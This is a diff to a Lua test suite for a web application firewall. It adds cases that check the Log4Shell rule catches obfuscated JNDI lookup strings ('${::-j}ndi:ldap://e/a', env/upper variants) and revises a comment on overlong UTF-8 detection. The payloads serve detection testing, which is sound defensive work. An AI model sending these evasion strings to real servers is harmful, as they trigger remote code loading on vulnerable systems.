@@ -1430,10 +1430,37 @@ do
   check(hit == false, "74: log4shell — clean POST does not fire")
 end
 
--- ── Test 75: rule_bad_utf8 — overlong "." encoding ──────────────────────────
--- "." is U+002E (1 byte). 2-byte overlong: 0xC0 0xAE. detect_bad_utf8 flags
--- this as UTF8_OVERLONG (it's also UTF8_BAD_LEAD since 0xC0 is < 0xC2 — the
--- detector emits UTF8_BAD_LEAD for that range, which is the stricter answer).
+-- ── Test 74a: rule_log4shell — every evasion tag fires ──────────────────────
+-- One case per evasion family so a regression in any single branch is caught.
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge")
+
+  local cases = {
+    { args = "x=${env:FOO:-j}ndi:ldap://e/a",            expect = "ENV"         },
+    { args = "x=${sys:user.home}",                       expect = "SYS"         },
+    { args = "x=${main:0}",                              expect = "MAIN"        },
+    { args = "x=${date:yyyy}",                           expect = "DATE"        },
+    { args = "x=${base64:Zm9v}",                         expect = "BASE64"      },
+    { args = "x=${upper:J}ndi:ldap://e/a",               expect = "UPPER"       },
+    { args = "x=${::-j}ndi:ldap://e/a",                  expect = "DEFAULT_VAL" },
+  }
+  for _, c in ipairs(cases) do
+    local hit, reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({ args = c.args }))
+    check(hit == true,
+          "74a/" .. c.expect .. ": hit=true (args=" .. c.args .. ")")
+    check(reason and reason:find("WAF_CVE:LOG4SHELL:" .. c.expect, 1, true),
+          "74a/" .. c.expect .. ": tag present (got " .. tostring(reason) .. ")")
+    check(waf_rule_id == 328,
+          "74a/" .. c.expect .. ": rule_id=328")
+  end
+end
+
+-- ── Test 75: rule_bad_utf8 — invalid lead byte (overlong dot attempt) ───────
+-- "." is U+002E (1 byte). The 2-byte overlong form is 0xC0 0xAE — but 0xC0
+-- itself is never a valid UTF-8 lead byte (RFC 3629 restricts 2-byte leads
+-- to 0xC2..0xDF precisely to forbid this overlong class). detect_bad_utf8
+-- flags it as UTF8_BAD_LEAD, the canonical answer for this attack pattern.
 do
   disable_all_rules()
   waf.set_rule("rule_bad_utf8", "logonly")
